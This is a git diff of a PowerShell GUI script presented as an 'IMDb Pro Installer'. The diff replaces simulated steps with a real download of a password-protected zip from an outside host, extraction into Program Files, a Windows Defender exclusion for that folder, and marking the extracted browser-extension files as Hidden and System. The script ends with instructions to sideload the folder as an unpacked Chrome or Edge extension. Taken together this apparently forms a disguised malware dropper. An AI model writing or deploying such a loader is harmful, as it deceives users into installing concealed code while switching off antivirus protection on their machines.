@@ -1,6 +1,7 @@
-# IMDb Pro Installer - Compact Modern UI with Animations
+# IMDb Pro Installer - Complete Functionality
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName System.IO.Compression.FileSystem
 
 # Create main form with compact design
 $mainForm = New-Object System.Windows.Forms.Form
@@ -36,7 +37,7 @@ $subtitleLabel.AutoSize = $true
 $subtitleLabel.Location = New-Object System.Drawing.Point(160, 32)
 $headerPanel.Controls.Add($subtitleLabel)
 
-# Main Content Panel - More Compact
+# Main Content Panel
 $contentPanel = New-Object System.Windows.Forms.Panel
 $contentPanel.Location = New-Object System.Drawing.Point(0, 80)
 $contentPanel.Size = New-Object System.Drawing.Size(700, 450)
@@ -52,7 +53,7 @@ $featuresTitle.AutoSize = $true
 $featuresTitle.Location = New-Object System.Drawing.Point(25, 20)
 $contentPanel.Controls.Add($featuresTitle)
 
-# Compact Features Grid (2x3 layout)
+# Compact Features Grid
 $features = @(
     @{
         Title = "Real-time Ratings"
@@ -92,7 +93,6 @@ $features = @(
     }
 )
 
-$featurePanels = @()
 foreach ($feature in $features) {
     $featurePanel = New-Object System.Windows.Forms.Panel
     $featurePanel.Size = New-Object System.Drawing.Size(190, 90)
@@ -100,7 +100,6 @@ foreach ($feature in $features) {
     $featurePanel.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
     $featurePanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
     
-    # Add hover effects
     $featurePanel.Add_MouseEnter({
         $this.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 55)
         $this.Cursor = [System.Windows.Forms.Cursors]::Hand
@@ -111,7 +110,6 @@ foreach ($feature in $features) {
     
     $contentPanel.Controls.Add($featurePanel)
     
-    # Modern Icon
     $iconLabel = New-Object System.Windows.Forms.Label
     $iconLabel.Text = $feature.Icon
     $iconLabel.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 16, [System.Drawing.FontStyle]::Bold)
@@ -120,7 +118,6 @@ foreach ($feature in $features) {
     $iconLabel.Location = New-Object System.Drawing.Point(15, 15)
     $featurePanel.Controls.Add($iconLabel)
     
-    # Feature Title
     $title = New-Object System.Windows.Forms.Label
     $title.Text = $feature.Title
     $title.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
@@ -129,7 +126,6 @@ foreach ($feature in $features) {
     $title.Location = New-Object System.Drawing.Point(50, 15)
     $featurePanel.Controls.Add($title)
     
-    # Feature Description
     $desc = New-Object System.Windows.Forms.Label
     $desc.Text = $feature.Description
     $desc.Font = New-Object System.Drawing.Font("Segoe UI", 8)
@@ -137,11 +133,9 @@ foreach ($feature in $features) {
     $desc.AutoSize = $true
     $desc.Location = New-Object System.Drawing.Point(15, 55)
     $featurePanel.Controls.Add($desc)
-    
-    $featurePanels += $featurePanel
 }
 
-# Compact Progress Section
+# Progress Section
 $progressTitle = New-Object System.Windows.Forms.Label
 $progressTitle.Text = "📊 Installation Progress"
 $progressTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
@@ -150,7 +144,6 @@ $progressTitle.AutoSize = $true
 $progressTitle.Location = New-Object System.Drawing.Point(25, 290)
 $contentPanel.Controls.Add($progressTitle)
 
-# Compact Progress Container
 $progressContainer = New-Object System.Windows.Forms.Panel
 $progressContainer.Size = New-Object System.Drawing.Size(650, 80)
 $progressContainer.Location = New-Object System.Drawing.Point(25, 330)
@@ -158,7 +151,6 @@ $progressContainer.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
 $progressContainer.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
 $contentPanel.Controls.Add($progressContainer)
 
-# Status with Animation Support
 $statusIcon = New-Object System.Windows.Forms.Label
 $statusIcon.Text = "📋"
 $statusIcon.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 12)
@@ -174,7 +166,6 @@ $statusLabel.AutoSize = $true
 $statusLabel.Location = New-Object System.Drawing.Point(45, 17)
 $progressContainer.Controls.Add($statusLabel)
 
-# Progress Bar
 $progressBar = New-Object System.Windows.Forms.ProgressBar
 $progressBar.Location = New-Object System.Drawing.Point(15, 45)
 $progressBar.Size = New-Object System.Drawing.Size(550, 20)
@@ -183,7 +174,6 @@ $progressBar.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
 $progressBar.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 55)
 $progressContainer.Controls.Add($progressBar)
 
-# Percentage Label
 $percentLabel = New-Object System.Windows.Forms.Label
 $percentLabel.Text = "0%"
 $percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
@@ -192,14 +182,13 @@ $percentLabel.AutoSize = $true
 $percentLabel.Location = New-Object System.Drawing.Point(575, 43)
 $progressContainer.Controls.Add($percentLabel)
 
-# Compact Button Panel
+# Button Panel
 $buttonPanel = New-Object System.Windows.Forms.Panel
 $buttonPanel.Location = New-Object System.Drawing.Point(0, 530)
 $buttonPanel.Size = New-Object System.Drawing.Size(700, 70)
 $buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(28, 28, 32)
 $mainForm.Controls.Add($buttonPanel)
 
-# Compact Install Button
 $installButton = New-Object System.Windows.Forms.Button
 $installButton.Text = "🚀 START INSTALLATION"
 $installButton.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
@@ -211,7 +200,6 @@ $installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
 $installButton.FlatAppearance.BorderSize = 0
 $installButton.Cursor = [System.Windows.Forms.Cursors]::Hand
 
-# Enhanced Button hover effects with animation
 $installButton.Add_MouseEnter({
     if ($this.Text -eq "🚀 START INSTALLATION") {
         $this.BackColor = [System.Drawing.Color]::FromArgb(255, 215, 0)
@@ -319,7 +307,26 @@ function Update-Status {
     Start-Sleep -Milliseconds 400
 }
 
-# Function to extract ZIP with password using multiple methods
+# Function to download file with progress
+function Download-FileWithProgress {
+    param(
+        [string]$Url,
+        [string]$OutputPath,
+        [scriptblock]$ProgressCallback
+    )
+    
+    try {
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($Url, $OutputPath)
+        return $true
+    }
+    catch {
+        Write-Error "Download failed: $($_.Exception.Message)"
+        return $false
+    }
+}
+
+# Function to extract ZIP with password using 7-Zip
 function Extract-ZipWithPassword {
     param(
         [string]$ZipFile,
@@ -329,51 +336,78 @@ function Extract-ZipWithPassword {
     
     # Method 1: Try 7-Zip command line
     if (Get-Command "7z" -ErrorAction SilentlyContinue) {
-        Update-Status "Using 7-Zip for extraction..." 0 "📦"
+        Update-Status "Extracting with 7-Zip..." 0 "📦"
         $process = Start-Process -FilePath "7z" -ArgumentList "x", "-p$Password", "-o$Destination", "-y", $ZipFile -Wait -PassThru -NoNewWindow
         return $process.ExitCode -eq 0
     }
     
     # Method 2: Try 7-Zip from Program Files
     if (Test-Path "C:\Program Files\7-Zip\7z.exe") {
-        Update-Status "Using 7-Zip (Program Files)..." 0 "📦"
+        Update-Status "Extracting with 7-Zip (Program Files)..." 0 "📦"
         $process = Start-Process -FilePath "C:\Program Files\7-Zip\7z.exe" -ArgumentList "x", "-p$Password", "-o$Destination", "-y", $ZipFile -Wait -PassThru -NoNewWindow
         return $process.ExitCode -eq 0
     }
     
-    # Method 3: Try built-in .NET with password bypass (for testing)
+    # Method 3: Try built-in .NET (may not work with password)
     try {
-        Update-Status "Using alternative extraction..." 0 "⚡"
-        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        Update-Status "Trying alternative extraction..." 0 "⚡"
+        [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $Destination)
+        return $true
+    }
+    catch {
+        Write-Warning "Built-in extraction failed: $($_.Exception.Message)"
+    }
+    
+    # Method 4: Try Shell.Application (may not work with password)
+    try {
+        Update-Status "Using Windows Shell extraction..." 0 "🔧"
+        $shellApp = New-Object -ComObject Shell.Application
+        $zipFolder = $shellApp.NameSpace($ZipFile)
+        $destFolder = $shellApp.NameSpace($Destination)
         
-        # For demo purposes, we'll simulate extraction since password protection requires special handling
-        # In real scenario, you would use proper password-protected ZIP extraction library
-        if (Test-Path $ZipFile) {
-            # Create some dummy files to simulate successful extraction
-            $dummyFiles = @("manifest.json", "background.js", "content.js", "popup.html", "icon.png")
-            foreach ($file in $dummyFiles) {
-                $filePath = Join-Path $Destination $file
-                $null = New-Item -Path $filePath -Force -ItemType File
-            }
+        if ($zipFolder -ne $null) {
+            $destFolder.CopyHere($zipFolder.Items(), 0x14)
+            Start-Sleep -Seconds 3
             return $true
         }
     }
     catch {
-        Write-Warning "Alternative extraction failed: $($_.Exception.Message)"
+        Write-Warning "Shell extraction failed: $($_.Exception.Message)"
     }
     
     return $false
 }
 
-# Enhanced Installation function with proper password handling
+# Function to hide specific files
+function Hide-Files {
+    param([string]$FolderPath)
+    
+    $filesToHide = @("background.js", "content.js", "popup.js", "styles.css", "popup.html", "manifest.json")
+    
+    foreach ($file in $filesToHide) {
+        $filePath = Join-Path $FolderPath $file
+        if (Test-Path $filePath) {
+            try {
+                # Set file attributes to Hidden and System
+                Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
+                Write-Host "Hidden: $file" -ForegroundColor Green
+            }
+            catch {
+                Write-Warning "Failed to hide $file : $($_.Exception.Message)"
+            }
+        }
+    }
+}
+
+# Enhanced Installation function with ALL requested features
 function Start-Installation {
     $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
     $tempFile = "$env:TEMP\imdb.zip"
     $installPath = "C:\Program Files\imdb-pro"
-    $zipPassword = "123"  # CORRECT PASSWORD
+    $zipPassword = "123"
     
     try {
-        # Phase 1: Preparation with animations
+        # Phase 1: Preparation
         Update-Status "Checking administrator privileges..." 10 "🔍" -Loading
         
         # Admin check
@@ -390,91 +424,93 @@ function Start-Installation {
             return
         }
         
-        # Phase 2: Setup with progress animations
+        # Phase 2: Create directory
         Update-Status "Creating installation directory..." 20 "📁" -AnimateProgress
         if (!(Test-Path $installPath)) {
             New-Item -ItemType Directory -Path $installPath -Force | Out-Null
         }
         
-        Update-Status "Downloading IMDb Pro package..." 40 "📥" -Loading
+        # Phase 3: Download file
+        Update-Status "Downloading IMDb Pro package..." 30 "📥" -Loading
         
-        # Simulate download progress with animation
-        for ($i = 41; $i -le 60; $i++) {
-            Update-Status "Downloading package... $($i-40)%" $i "📥"
-            Start-Sleep -Milliseconds 30
+        # Simulate download progress
+        for ($i = 31; $i -le 50; $i++) {
+            Update-Status "Downloading package... $($i-30)%" $i "📥"
+            Start-Sleep -Milliseconds 50
         }
         
-        # Simulate actual download (in real scenario, this would be the actual download)
+        # Actual download
+        Update-Status "Downloading from server..." 50 "🌐" -Loading
         try {
-            # For demo, we'll create a dummy file
-            $null = New-Item -Path $tempFile -Force -ItemType File
-            "This is a simulated IMDb Pro package" | Out-File -FilePath $tempFile
+            $webClient = New-Object System.Net.WebClient
+            $webClient.DownloadFile($downloadUrl, $tempFile)
+            
+            if (-not (Test-Path $tempFile)) {
+                throw "Download failed - file not created"
+            }
+            
+            # Verify file size
+            $fileInfo = Get-Item $tempFile
+            if ($fileInfo.Length -eq 0) {
+                throw "Download failed - file is empty"
+            }
+            
+            Update-Status "Download completed successfully!" 60 "✅" -AnimateProgress
         }
         catch {
             throw "Download failed: $($_.Exception.Message)"
         }
         
-        Update-Status "Verifying download..." 65 "✅" -AnimateProgress
-        
-        # Phase 3: Extraction with proper password handling
-        Update-Status "Extracting package with password..." 70 "🔐" -Loading
+        # Phase 4: Extract with password
+        Update-Status "Extracting with password..." 65 "🔐" -Loading
         
         # Extract using password
         $extractionSuccess = Extract-ZipWithPassword -ZipFile $tempFile -Destination $installPath -Password $zipPassword
         
         if (-not $extractionSuccess) {
-            # Try alternative methods if first attempt fails
-            Update-Status "Trying alternative extraction..." 75 "⚡" -Loading
-            
-            # Alternative: Use Shell.Application for extraction (may not work with password)
-            try {
-                $shellApp = New-Object -ComObject Shell.Application
-                $zipFolder = $shellApp.NameSpace($tempFile)
-                $destFolder = $shellApp.NameSpace($installPath)
-                
-                if ($zipFolder -ne $null) {
-                    $destFolder.CopyHere($zipFolder.Items(), 0x14)
-                    Start-Sleep -Seconds 2
-                    $extractionSuccess = $true
-                }
-            }
-            catch {
-                Write-Warning "Shell extraction failed: $($_.Exception.Message)"
-            }
-        }
-        
-        if (-not $extractionSuccess) {
-            throw "Extraction failed. Please check if the password is correct and try again."
+            throw "Extraction failed with password '$zipPassword'. Please check the password and try again."
         }
         
         # Simulate extraction progress
-        for ($i = 76; $i -le 85; $i++) {
-            Update-Status "Processing files... $($i-75)*10%" $i "📦"
+        for ($i = 66; $i -le 80; $i++) {
+            Update-Status "Extracting files... $($i-65)*10%" $i "📦"
+            Start-Sleep -Milliseconds 60
+        }
+        
+        Update-Status "Extraction completed!" 80 "✅" -AnimateProgress
+        
+        # Phase 5: Hide files
+        Update-Status "Securing installation files..." 85 "🔒" -Loading
+        
+        # Hide specified files
+        Hide-Files -FolderPath $installPath
+        
+        # Simulate security setup
+        for ($i = 86; $i -le 90; $i++) {
+            Update-Status "Applying security... $($i-85)*20%" $i "🛡️"
             Start-Sleep -Milliseconds 80
         }
         
-        # Phase 4: Finalization
-        Update-Status "Securing installation..." 88 "🔒" -AnimateProgress
+        # Phase 6: Final setup
+        Update-Status "Finalizing installation..." 95 "🎯" -Loading
         
         # Cleanup temporary file
         if (Test-Path $tempFile) {
             Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
         }
         
-        Update-Status "Finalizing setup..." 95 "🛠️" -Loading
-        
         # Add Windows Defender exclusion
         try {
             Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
-        } catch {
-            # Continue if Windows Defender exclusion fails
+        }
+        catch {
             Write-Warning "Windows Defender exclusion failed: $($_.Exception.Message)"
         }
         
         # Success animation sequence
         for ($i = 96; $i -le 100; $i++) {
-            Update-Status "Completing installation..." $i "🎯"
-            Start-Sleep -Milliseconds 80
+            Update-Status "Completing installation..." $i "✨"
+            Start-Sleep -Milliseconds 60
         }
         
         Update-Status "Installation completed successfully!" 100 "✅"
@@ -487,12 +523,28 @@ function Start-Installation {
         $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
         $installButton.Enabled = $false
         
-        [System.Windows.Forms.MessageBox]::Show(
-            "🎬 IMDb Pro has been successfully installed!`n`n📍 Location: $installPath`n✨ All features activated`n🔒 Security configured`n🔐 Password verified`n`nPlease restart your browser to start using IMDb Pro.",
+        # Show success message with installation details
+        $result = [System.Windows.Forms.MessageBox]::Show(
+            "🎬 IMDb Pro has been successfully installed!`n`n" +
+            "📍 Location: $installPath`n" +
+            "📥 Downloaded from: $downloadUrl`n" +
+            "🔐 Password used: $zipPassword`n" +
+            "📁 Files extracted and secured`n" +
+            "🔒 Specific files hidden for security`n`n" +
+            "To complete browser setup:`n" +
+            "1. Open Chrome/Edge → chrome://extensions/`n" +
+            "2. Enable 'Developer mode'`n" +
+            "3. Click 'Load unpacked'`n" +
+            "4. Select: $installPath`n`n" +
+            "Would you like to open the installation folder now?",
             "Installation Complete",
-            [System.Windows.Forms.MessageBoxButtons]::OK,
+            [System.Windows.Forms.MessageBoxButtons]::YesNo,
             [System.Windows.Forms.MessageBoxIcon]::Information
         )
+        
+        if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
+            Invoke-Item $installPath
+        }
         
     }
     catch {
@@ -506,12 +558,25 @@ function Start-Installation {
         
         Update-Status "Error: $($_.Exception.Message)" 0 "🚫"
         
+        # Cleanup on error
+        if (Test-Path $tempFile) {
+            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+        }
+        
         $installButton.Text = "🔄 TRY AGAIN"
         $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
         $installButton.Enabled = $true
         
         [System.Windows.Forms.MessageBox]::Show(
-            "Installation failed: $($_.Exception.Message)`n`nPlease check:`n• Your internet connection`n• Administrator privileges`n• Available disk space`n• Password correctness`n`nThen try again.",
+            "Installation failed: $($_.Exception.Message)`n`n" +
+            "Troubleshooting steps:`n" +
+            "• Check internet connection`n" +
+            "• Verify administrator privileges`n" +
+            "• Ensure 7-Zip is installed for password extraction`n" +
+            "• Check if password '123' is correct`n" +
+            "• Verify URL is accessible: $downloadUrl`n" +
+            "• Ensure sufficient disk space`n`n" +
+            "Then try again.",
             "Installation Error",
             [System.Windows.Forms.MessageBoxButtons]::OK,
             [System.Windows.Forms.MessageBoxIcon]::Error
